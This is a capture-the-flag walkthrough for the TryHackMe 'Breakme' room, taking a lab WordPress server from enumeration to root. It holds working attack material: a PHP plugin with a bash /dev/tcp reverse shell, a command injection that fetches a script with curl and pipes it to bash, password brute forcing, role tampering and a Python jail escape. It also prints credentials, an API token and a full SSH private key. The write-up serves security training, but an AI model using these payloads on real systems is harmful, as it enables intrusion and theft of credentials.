# TryHackMe - Breakme Walkthrough

## Overview  
This walkthrough provides a detailed guide to complete the TryHackMe Breakme room. It covers enumeration, exploitation, gaining admin access, and achieving a reverse shell. Tools like Nmap, WPScan, and Burp Suite are used for enumeration and exploitation.

## Goal  
- Identify vulnerabilities on the target machine.
- Gain administrative access to the WordPress site.
- Achieve a reverse shell to the target system.
- Escalate privileges to access sensitive files or gain root access.

## Step-by-Step Breakdown  

### 1. Enumeration  
#### Scan for Open Ports  
Use Nmap to identify open ports and running services:  
```bash
sudo nmap 10.10.225.159 -sV -oN nmapTop1000 -v
```

Discover Files and Directories

Use ffuf to discover hidden files and directories:
```bash
sudo ffuf -w /path/to/big.txt -u http://10.10.225.159/FUZZ -fc 403
```

Found: /wordpress/

Scan WordPress Installation

Install WPScan and scan the WordPress site:
```bash
sudo docker run --rm -it wpscanteam/wpscan --url http://10.10.225.159/wordpress/ --enumerate
```

If needed, register for an API token for additional features:
```bash
wpscan --url http://10.10.225.159/wordpress/ --api-token YOUR_API_TOKEN
```

### 2. Exploitation

Enumerate Users

Check for users via WPScan or the API:
```bash
curl http://10.10.225.159/wordpress/wp-json/v2/users
```

without token
```bash
sudo wpscan --url http://10.10.212.180/wordpress/ --enumerate
sudo docker run --rm -it wpscanteam/wpscan --url http://10.10.181.213/wordpress/ --enumerate
```

Found user: bob

Other Method (Its the same actually):

Password Attack

Use a wordlist to brute force the password for bob:
```bash
sudo docker run --rm -it -v /path/to/wordlists:/wordlists \
wpscanteam/wpscan --url http://10.10.225.159/wordpress/ -U bob -P /wordlists/rockyou.txt
```

Other Steps:

Using a Custom Wordlist with WPScan: You can also use a custom wordlist (i.e., a list of the 35 usernames you generated) with WPScan to try and find valid usernames:

First, create a text file with your list of possible usernames (e.g., usernames.txt).

Example usernames.txt:
```bash
sql
Copiar código
corporation_test
corporationtest
CorporationTest
Corporation_Test
TestCorporation
test_corporation
testcorporation
Corporation
Test
corp_test
corp
c_test
ctest
c_test_01
corp01
CorporationTest2024
test_corp123
Corp_Test_01
corporation_test_123
corporation_test1
test-corp
admin
administrator
root
user
support
manager
editor
corporation_test@domain.com
corporation_test123@domain.com
ctest@domain.com
admin@corporation.com
corp_test01
corporation_test_001
test_corp_1
```

Now, run WPScan using this wordlist to test usernames:
```bash
sudo docker run --rm -it --user $(id -u):$(id -g) \
-v /root/Tools/wordlists:/wordlists \
wpscanteam/wpscan --url http://10.10.253.1 --api-token VyjB9rxyQz0cFqLA14dKJ8aLwbZeNEleBazHsRS1J8o \
--usernames /wordlists/usernames.txt
```
or
```bash
sudo docker run --rm -it --user $(id -u):$(id -g) \ -v /root/Tools/wordlists:/wordlists \ wpscanteam/wpscan --url http://10.10.253.1 --api-token VyjB9rxyQz0cFqLA14dKJ8aLwbZeNEleBazHsRS1J8o \ --usernames /wordlists/usernames.txt --passwords /wordlists/rockyou.txt --force
```

WPScan will try to check each username from the wordlist and report if any are valid.

Found password: soccer

Gain Admin Access:

Use Burp Suite to intercept and modify the profile.php request. Add the &wpda_role[]=administrator parameter and forward the request to gain admin privileges.

Enable Burb on the browser
Capture packer from update profile:
```bash
_wpnonce=b432c8444e&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fprofile.php%3Fupdated%3D1&from=profile&checkuser_id=2&color-nonce=aad8983489&admin_color=fresh&admin_bar_front=1&first_name=bob&last_name=bob&nickname=bob&display_name=bob+bob&email=bob%40localhost.com&url=&description=&pass1=&pass2=&action=update&user_id=2&submit=Update+Profile
```

add:
```bash
&wpda_role[]=administrator
```

and hit forward on Burb

we will be logged as admin


### 3. Reverse Shell

Create and Upload a Malicious Plugin

Create a plugin directory and PHP file:
```bash
mkdir breakme
vim breakme/breakme.php
```

Add the reverse shell payload:
```bash
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.147.84/1234 0>&1'");
?>
```

Zip the plugin folder:
```bash
zip -r breakme.zip breakme/
```

Start a Listener

Set up a listener on your machine:
```bash
nc -lvnp 1234
```

Upload and Activate the Plugin

Upload breakme.zip via the WordPress admin panel, then activate the plugin to trigger the reverse shell.


### 4. Post-Exploitation

Escalate Privileges

Stabilize the shell:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Export the terminal:
```bash
export TERM=xterm
```

Access sensitive files like wp-config.php for database credentials:
```bash
cat wp-config.php
```

```bash
Result:
www-data@Breakme:/var/www/html/wordpress$ cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdatabase' );

/** Database username */
define( 'DB_USER', 'econor' );

/** Database password */
define( 'DB_PASSWORD', 'SuP3rS3cR37#DB#P@55wd' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );
```

```bash
cd /home

ls
john  lost+found  youcef

cd john

ls
internal  user1.txt


ls -la
```

List:
```bash
ps aux
```

john has a php server running on port 9999:
```bash
ps aux | grep -i john
```


so we need to find a way to make tunnling to see what is that server running.
We can use tool called chisel.
https://github.com/jpillora/chisel


### 5. Gain DB Acess (check):
```bash
cat wp-config.php

www-data@Breakme:/var/www/html/wordpress$ cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdatabase' );

/** Database username */
define( 'DB_USER', 'econor' );

/** Database password */
define( 'DB_PASSWORD', 'SuP3rS3cR37#DB#P@55wd' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );
```

Access DB:
```bash
mysql -u econor -p -h localhost wpdatabase
www-data@Breakme:/var/www/html/wordpress$ mysql -u econor -p -h localhost wpdatabase

Enter password: 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 387
Server version: 10.5.19-MariaDB-0+deb11u2 Debian 11

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [wpdatabase]>
```

Command:
```bash
SHOW TABLES;
```

Users:
```bash
SELECT * FROM wp_users;
```

Admin User:

admin
admin@localhost.com 

Admin password:
$P$BlnXZ2omtPVcOotjXqtdQrN.IS0tqU.

Reset the Password via SQL (Recommended)
```bash
UPDATE wp_users SET user_pass = MD5('12345678') WHERE user_login = 'admin';
```

Remove plugin:
```bash
rm -rf breakme
```

Access as admin:

User:
admin

Password:
12345678

Copy the hash string in full, like: admin:*HASH

crack password:
```bash
john hash.txt
```

### 6. Gain ssh access through mysql (If possible):

install mysql
verify login
use metasploit

Access ssh:
ssh name@http://10.10.212.180
password


### 7. Access Tools App (not related to Wordpress):

john has a php server running on port 9999:
```bash
ps aux | grep -i john
```

So we need to find a way to make tunnling to see what is that server running.
We can use tool called chisel.
https://github.com/jpillora/chisel/releases

download on local machine
```bash
chisel_1.10.1_linux_amd64.gz 

gunzip chisel_1.10.1_linux_amd64.gz

mv chisel_1.10.1_linux_amd64 chisel

chmod +x chisel

./chisel server --reverse --port 8001
```

Open a python server in my local machine new bash
```bash
python3 -m http.server 8000
```


Shell:
```bash
cd /tmp

www-data@Breakme:/tmp$ 
wget http://10.10.241.80:8000/chisel

chmod +x chisel

./chisel client 10.10.241.80:8001  R:9999:localhost:9999
```

Go to browser:
```bash
localhost:9999
```

Create Reverse shell:
```bash
shell.sh
```

add:
```bash
sh -i >& /dev/tcp/10.10.241.80/9001 0>&1
```

listen to port in new shell:
```bash
nc -lvnp 9001
```

Go to Check User in Browser App:

add:
```bash
|curl${IFS}http://10.10.241.80:8000/shell.sh|bash
```

We should get a shell in the new running local server
```bash
$ id
uid=1002(john) gid=1002(john) groups=1002(john)
$ whoami
john
```

add:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

we should be now using john

add:
```bash
export TERM=xterm
ctrl Z
stty raw -echo; fg
```

check files:
```bash
ls -la

cd ..

ls

cat user1.txt
```

We get the first flag:
```bash
5c3ea0d312568c7ac68d213785b26677
```

Now we need to get the second flag from the second user 'youcef'
```bash
cd /home/youcef
ls -la
-rwsr-sr-x 1 youcef youcef 17176 Aug  2  2023 readfile
-rw------- 1 youcef youcef  1026 Aug  2  2023 readfile.c
```

Create server to download file:
```bash
python3 -m http.server
```

Go to on browser 10.10.145.24:8000

Download readfile

ctrl Z on youcef server

Open Ghidra and create new project breakme

Import redfile and open it

filter main and select it

search for  0x3ea which mean 1002 which is user john (so you cannot run this script if you ar e ot john)

go to john directory
```bash
cd /home/john

nano race.sh
```

paste:
https://raw.githubusercontent.com/djalilayed/tryhackme/refs/heads/main/breakme/race.sh

save it
ctrl x

```bash
chmod +x race.sh

./race.sh
```

I guess you won!
```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
TabCXd2Ji/Y7UvM=
-----END OPENSSH PRIVATE KEY-----
I guess you won!
Private key found! Stopping the loop...
```

As we can see, after a while, we win the race and manage to read /home/youcef/.ssh/id_rsa.


new bash
```bash
vim key

paste key

:wq
```

permission
```bash
chmod 400 key
```

get ssh password:

We can try brute-forcing the passphrase. First, we use ssh2john to convert it to a format that john can work with.
```bash
ssh2john id_rsa > sh_key.hash
```

```bash
locate john | grep ssh
/opt/john/ssh2john.py id_rsa > sh_key.hash
cat sh_key.hash
john sh_key.hash -w /root/Tools/wordlists/rockyou.txt --format=ssh
```

Show the cracked passphrase (if found):
```bash
john --show /root/sh_key.hash
```


password:
a123456

id_rsa:a123456

adjust the permissions of the id_rsa file:
```bash
chmod 600 /root/id_rsa
```


connect
```bash
ssh -i id_rsa youcef@10.10.57.160

ls

ls -la

cd .ssh

cat user2.txt
```

second flag:
```bash
df5b1b7f4f74a416ae276773b22633c1b
```


Time To Get Root!

Checking priveleges of Youcef
```bash
sudo -l

sudo /usr/bin/python3 /root/jail.py
```

Break the jail:
```bash
print(__builtins__.__dict__['__IMPORT__'.casefold()]('OS'.casefold()).__dict__[f'SYSTEM'.casefold()]('BASH'.casefold()))
```

or
```bash
__builtins__.__dict__['__IMPORT__'.casefold()]('OS'.casefold()).__dict__['SYSTEM'.casefold()]('/lib/yorick/bin/yorick')
```

```bash
cd ~

id

ls -la

wc -c .root.txt

root@Breakme:~# 
cat .root.txt 
```

Root flag:
```bash
e257d58481412f8772e9fb9fd47d8ca4
```